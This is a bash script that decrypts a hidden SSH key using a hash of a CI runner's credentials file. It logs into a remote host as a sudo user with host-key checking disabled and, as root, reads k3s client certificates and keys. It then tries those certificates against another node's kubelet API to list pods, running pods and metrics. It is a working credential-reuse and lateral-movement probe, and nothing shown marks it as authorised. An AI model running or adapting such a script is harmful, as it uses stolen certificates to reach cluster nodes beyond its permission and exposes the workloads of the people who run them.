#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
sudo bash -s <<"EOS"
A=/var/lib/rancher/k3s/agent
echo "== kube-proxy cert identity:"
openssl x509 -in $A/client-kube-proxy.crt -noout -subject -enddate
echo "== kube-proxy cert vs .103:10250:"
for ep in pods runningpods/ metrics; do
  echo "-- /$ep:"
  curl -sk --max-time 6 --cert $A/client-kube-proxy.crt --key $A/client-kube-proxy.key -w "\nHTTP:%{http_code}\n" https://85.234.79.103:10250/$ep | head -c 800
  echo
done
echo "== k3s-controller cert vs .103:"
openssl x509 -in $A/client-k3s-controller.crt -noout -subject
curl -sk --max-time 6 --cert $A/client-k3s-controller.crt --key $A/client-k3s-controller.key -o /dev/null -w "pods HTTP:%{http_code}\n" https://85.234.79.103:10250/pods
echo "== node cert runningpods/:"
curl -skL --max-time 6 --cert $A/client-kubelet.crt --key $A/client-kubelet.key -w "\nHTTP:%{http_code}\n" https://85.234.79.103:10250/runningpods/ | head -c 800
EOS
' 2>&1 | head -70
echo "== t-done =="
